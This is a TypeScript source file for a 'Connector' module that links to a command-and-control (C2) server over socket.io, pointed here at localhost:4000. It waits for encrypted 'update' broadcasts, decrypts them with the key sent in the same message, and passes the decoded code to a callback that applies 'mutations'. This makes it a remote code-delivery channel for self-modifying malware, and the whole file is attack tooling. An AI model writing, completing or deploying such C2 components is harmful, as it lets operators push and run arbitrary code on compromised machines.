import { io, Socket } from 'socket.io-client';
import { decrypt } from './crypto';
import { logger } from '../utils';

const C2_URL = 'http://localhost:4000';

export const initializeConnector = (applyMutationCallback: (code: string) => void): void => {
    logger.info('Module [Connector]: Initializing real-time connection to C2...');
    const socket = io(C2_URL, {
        reconnectionAttempts: 5,
        reconnectionDelay: 3000,
    });

    socket.on('connect', () => {
        logger.info(`Module [Connector]: Successfully connected to C2 server with socket ID ${socket.id}. Awaiting instructions.`);
    });

    socket.on('update', (data: { payload: string; key: string }) => {
        if (!data || !data.payload || !data.key) {
            logger.warn('Module [Connector]: Received invalid "update" event from C2.');
            return;
        }

        logger.info('Module [Connector]: Received mutation broadcast from C2. Decrypting and applying...');
        try {
            const decrypted = decrypt(data.payload, data.key);
            if (decrypted && typeof (decrypted as any).code === 'string') {
                applyMutationCallback((decrypted as any).code);
            } else {
                logger.error('Module [Connector]: Failed to decrypt or parse broadcasted mutation payload.');
            }
        } catch (e: any) {
            logger.error(`Module [Connector]: Error processing broadcasted mutation: ${e.message}`);
        }
    });
    
    socket.on('disconnect', (reason) => {
        logger.warn(`Module [Connector]: Disconnected from C2 server. Reason: ${reason}`);
    });

    socket.on('connect_error', (err) => {
        logger.error(`Module [Connector]: Connection error: ${err.message}`);
    });
};
